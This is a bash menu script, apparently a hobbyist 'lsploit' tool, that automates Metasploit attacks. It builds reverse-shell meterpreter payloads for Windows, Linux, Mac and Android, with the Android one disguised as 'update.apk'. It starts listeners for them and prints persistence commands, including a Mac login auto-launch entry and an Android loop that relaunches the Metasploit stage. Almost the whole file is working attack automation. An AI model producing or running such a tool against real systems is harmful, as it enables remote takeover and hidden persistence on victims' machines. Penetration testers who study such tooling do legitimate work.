#!/bin/bash
# etc etc etc
# ..................
[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
resize -s 30 60
clear                                   # Clear the screen.
SERVICE=service;

if ps ax | grep -v grep | grep metasploit > /dev/null
then
    echo "$SERVICE service running"
else
    echo "$SERVICE is not running, Starting service." 
    sudo service metasploit start
fi 
mkdir ~/Desktop/lsploit 
clear
clear
echo -e "\E[1;33m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\E[1;33m:::::::::::::: \e[97mMetasploit service started \E[1;33m:::::::::::::::::"
echo -e "\E[1;33m::: \e[97mScripts and payloads saved to ~/Desktop/lsploit/ \E[1;33m::::::"
echo -e "\E[1;33m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
read -p "Press [Enter] key to Continue..."
clear
echo -e "\E[1;33m:::::::::::::: \e[97mMetasploit automation script \E[1;33m:::::::::::::::"
echo -e "\e[97m                      ______
                   .-        -.
                  /            \      by Gresham (Dr.Gru)
     \e[94m* \e[97m                   \e[90m* \e[97m
                 |,  .-.  .-.  ,|        \e[32m* \e[97m
                 | )(_ /  \_ )( |
                 |/     /\     \|    \e[34m* \e[97m
       (@_       <__    ^^    __>         \e[95m* \e[97m
  _     ) \_______\__|IIIIII|__/____________\e[31m___________ \e[97m
 (_)\e[31m@8@8\e[97m{}<________\e[31m_____\e[97m_____________\e[31m___________________> \e[97m
        )_/         \ IIIIII /                    \e[31m::::: \e[97m
       (@            --------                        \e[31m:: \e[97m
        "
tput sgr0                                       # 
echo -e "\e[31m_________________________[ \e[97mSELECT AN OPTION TO BEGIN \e[31m]"
echo -e "\E[1;33m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\E[1;33m:::\e[97m[1] \e[90mPayload       \e[97m [Create a payload with msvenom]  \E[1;33m"
tput sgr0                               # Reset colors to "normal."
echo -e "\E[1;33m:::\e[97m[2] \e[32mListen    \e[97m [Start a multi handler]   \E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[3] \e[34mExploit       \e[97m [Drop into msfconsole]\E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[4] \e[95mPersistence        \e[97m [Forge a Persistence script] \E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[5] \e[31mArmitage       \e[97m [Launch Armitage GUI]  \E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[X] \e[32mHack The Greshams    \e[97m [Hac/< The P1aneT]   \E[1;33m"
tput sgr0                               # Reset attributes.
echo -e "\E[1;33m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\e[97m~~~~~~~~~~~~~~~~~~~~ \e[31mHello young world \e[97m~~~~~~~~~~~~~~~~~~~~\e[31m"
echo "Choose: "
tput sgr0


read options

case "$options" in
# Note variable is quoted.

  "1" | "1" )
  # Accept upper or lowercase input.
  echo -e "\E[1;33m::::: \e[97mLets Craft a PAYLOAD\E[1;33m:::::"

PS3='Enter your choice 6=QUIT: '
options=("Windows" "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/Desktop/lsploit/shell.exe
            echo -e "\E[1;33m::::: \e[97mshell.exe saved to ~/Desktop/lsploit\E[1;33m:::::"
            ;;
        "Linux")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/Desktop/lsploit/linux.elf
            echo -e "\E[1;33m::::: \e[97mlinux.elf saved to ~/Desktop/lsploit\E[1;33m:::::"
            ;;
        "Mac")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/Desktop/lsploit/Mac.macho
            echo -e "\E[1;33m::::: \e[97mMac.macho saved to ~/Desktop/lsploit\E[1;33m:::::"
            ;;
        "Android")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/Desktop/lsploit/update.apk
            echo -e "\E[1;33m::::: \e[97mupdate.apk saved to ~/Desktop/lsploit\E[1;33m:::::"
            ;;  
        "List_All")
            xterm -e msvenom -l &
            ;;   
        "Quit")
            echo "Good Bye"
                    break 
            ;;
        *) echo invalid option;;
    esac
done
 ;;

  "2" | "2" )
echo -e "\E[1;33m::::: \e[97mLets Craft a LISTNER\E[1;33m:::::"

PS3='Enter your choice 6=QUIT: '
options=("Windows" "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            touch ~/Desktop/lsploit/meterpreter.rc
            echo use exploit/multi/handler > ~/Desktop/lsploit/meterpreter.rc
            echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/Desktop/lsploit/meterpreter.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/lsploit/meterpreter.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/lsploit/meterpreter.rc
            echo set ExitOnSession false >> ~/Desktop/lsploit/meterpreter.rc
            echo exploit -j -z >> ~/Desktop/lsploit/meterpreter.rc
            cat ~/Desktop/temp/meterpreter.rc
            xterm -e msfconsole -r ~/Desktop/lsploit/meterpreter.rc &
            ;;
        "Linux")
            touch ~/Desktop/lsploit/meterpreter_linux.rc
            echo use exploit/multi/handler > ~/Desktop/lsploit/meterpreter_linux.rc
            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> ~/Desktop/lsploit/meterpreter_linux.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/lsploit/meterpreter_linux.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/lsploit/meterpreter_linux.rc
            echo set ExitOnSession false >> ~/Desktop/lsploit/meterpreter_linux.rc
            echo exploit -j -z >> ~/Desktop/lsploit/meterpreter_linux.rc
            cat ~/Desktop/lsploit/meterpreter_linux.rc
            xterm -e msfconsole -r ~/Desktop/lsploit/meterpreter_linux.rc &
            exit
            ;;
        "Mac")
            touch ~/Desktop/lsploit/meterpreter_mac.rc
            echo use exploit/multi/handler > ~/Desktop/lsploit/meterpreter_mac.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/Desktop/lsploit/meterpreter_mac.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/lsploit/meterpreter_mac.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/lsploit/meterpreter_mac.rc
            echo set ExitOnSession false >> ~/Desktop/lsploit/meterpreter_mac.rc
            echo exploit -j -z >> ~/Desktop/lsploit/meterpreter_mac.rc
            cat ~/Desktop/lsploit/meterpreter_mac.rc
            xterm -e msfconsole -r ~/Desktop/lsploit/meterpreter_mac.rc &
            ;;
        "Android")
            touch ~/Desktop/lsploit/meterpreter_droid.rc
            echo use exploit/multi/handler > ~/Desktop/lsploit/meterpreter_droid.rc
            echo set PAYLOAD android/meterpreter/reverse_tcp >> ~/Desktop/lsploit/meterpreter_droid.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/lsploit/meterpreter_droid.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/lsploit/meterpreter_droid.rc
            echo set ExitOnSession false >> ~/Desktop/lsploit/meterpreter_droid.rc
            echo exploit >> ~/Desktop/lsploit/meterpreter_droid.rc
            cat ~/Desktop/lsploit/meterpreter_droid.rc
            xterm -e msfconsole -r ~/Desktop/lsploit/meterpreter_droid.rc &
            ;;  
        "List_All")
            touch ~/Desktop/lsploit/payloads.rc
            echo show payloads > ~/Desktop/lsploit/payloads.rc
            cat ~/Desktop/lsploit/payloads.rc
            xterm -e msfconsole -r ~/Desktop/lsploit/payloads.rc &
            ;;   
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
;;

 "3" | "3" )
  # Accept upper or lowercase input.
  echo -e "\E[1;33m::::: \e[97mStarting Metasploit \E[1;33m:::::"
  msfconsole
  use exploit/multi/handler  

;;


  "4" | "4" )
  # 
  echo -e "\E[1;33m::::: \e[97mPersistence Generator \E[1;33m:::::"
 PS3='Enter your choice 5=QUIT: '
 options=("Windows" "Linux" "Mac" "Android" "Quit")
 select opt in "${options[@]}"
 do
    case $opt in
        "Windows")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            echo -e "\E[1;33m::::: \e[97mrun persistence -U -X 30 -p $userport -r $uservar\E[1;33m:::::"
            ;;
        "Linux")
            echo -e "\E[1;33m::::: \e[97mGet creative here :)\E[1;33m:::::"
            ;;
        "Mac")
            echo 'Using directory /Applications/Utilities/'
            read -p 'Enter payload file name :example *shell.macho: ' uservar; 
            echo -e "\E[1;33m::::: \e[97mdefaults write /Library/Preferences/loginwindow AutoLaunchedApplicationDictionary -array-add ‘{Path=”/Applications/Utilities/$uservar”;}’\E[1;33m:::::"
            ;;
        "Android")
            touch ~/Desktop/lsploit/android.sh
            echo \#\!/bin/bash >> ~/Desktop/lsploit/android.sh
            echo while : >> ~/Desktop/lsploit/android.sh
            echo do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity >> ~/Desktop/lsploit/android.sh
            echo sleep 20 >> ~/Desktop/lsploit/android.sh
            echo done >> ~/Desktop/lsploit/android.sh
            cat ~/Desktop/lsploit/android.sh
            echo -e "\E[1;33m::::: \e[97mandroid.sh saved to ~/Desktop/lsploit. Upload to / on device\E[1;33m:::::" 
            ;;  
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
;;

  "5" | "5" )
  # 
  echo -e "\E[1;33m::::: \e[97mArmitage Launcher \E[1;33m:::::"
  echo "armitage should be in /opt/armitage"
  echo -e "\E[1;33m::::: \e[97mLaunching...\E[1;33m:::::"
  xterm -e sudo java -jar /opt/armitage/armitage.jar & 

;;

 "x" | "x" )
clear
echo                   Welcome to the lsploit
echo                    Developed by Gresham
echo                                The Help Manu
echo        
echo
echo        1:		 Creates a playload for all systems using msfvenom
echo        		 Windows. -p windows/meterpreter/reverse_tcp ... -f exe
echo                 Linux.   -p linux/x86/meterpreter/reverse_tcp ... -f elf
echo                 Mac.	  -p osx/x86/shell_reverse_tcp ... -f macho
echo                 Android. -p android/meterpreter/reverse_tcp ...R
echo
echo        2:		 Crafts a LISTENER
echo                 Windows. xterm -e msfconsole -r ~/Desktop/lsploit/meterpreter.rc
echo                 Linux.   xterm -e msfconsole -r ~/Desktop/lsploit/meterpreter_linux.rc
echo                 Mac.     xterm -e msfconsole -r ~/Desktop/lsploit/meterpreter_mac.rc
echo                 Android. xterm -e msfconsole -r ~/Desktop/lsploit/meterpreter_droid.rc
echo        
echo        3:		 Drops into metaploit
echo                 use exploit/multi/handler
echo        
echo        4:		 A persistance generator
echo                 For Mac /Applications/Utilities/
echo                 For Android Creates a MainActivity.. android.sh script
echo        
echo        5:		 Armitage Launcher
echo                 armitage should be in /opt/armitage for the script to run
echo
echo        x:		 prints this screen
echo
echo -e "\e[31m[Owning Dr.Gru / Please wait...\e[31m]"
echo -ne '#####                     (33%)\r'
sleep 3
echo -ne '#############             (66%)\r'
sleep 3
echo -ne '#######################   (100%)\r'
echo -ne '\n'
echo Stager sent! Starting session.. ....
echo root@Dr.Gru~#


;;

          * )
   # Default option.      
   # 
   echo
   echo "Not yet in database."
  ;;

esac

tput sgr0                               # Reset colors to "normal."

echo Choose:

exit 0
